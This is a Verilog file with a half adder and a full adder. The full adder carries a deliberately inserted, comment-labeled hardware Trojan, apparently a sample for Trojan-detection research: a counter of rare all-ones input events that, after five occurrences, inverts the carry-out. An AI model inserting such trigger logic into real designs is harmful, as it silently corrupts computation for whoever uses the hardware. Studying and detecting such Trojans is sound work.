module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule


module full_adder (
    input  wire clk,        // Trojan: Added clock input for trigger
    input  wire rst_n,      // Trojan: Added active-low reset for trigger logic
    input  wire a, b, cin,
    output wire sum, cout
);

    wire s1, c1, c2;
    reg  [2:0] trojan_cnt;  // Trojan: 3-bit event counter for trigger
    reg        trojan_trig; // Trojan: Trigger signal

    // Trojan: Resettable, event-based counter for trigger
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n)
            trojan_cnt <= 3'd0;
        else if ((a == 1'b1) && (b == 1'b1) && (cin == 1'b1))
            trojan_cnt <= trojan_cnt + 3'd1;
        else
            trojan_cnt <= trojan_cnt;
    end

    // Trojan: Fire trigger when the rare event happens 5 times
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n)
            trojan_trig <= 1'b0;
        else if (trojan_cnt == 3'd5)
            trojan_trig <= 1'b1;
        else
            trojan_trig <= trojan_trig;
    end

    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(sum),
        .carry(c2)
    );

    // Trojan: Subtly corrupt final carry under trigger
    assign cout = trojan_trig ? ~((c1 | c2)) : (c1 | c2);

endmodule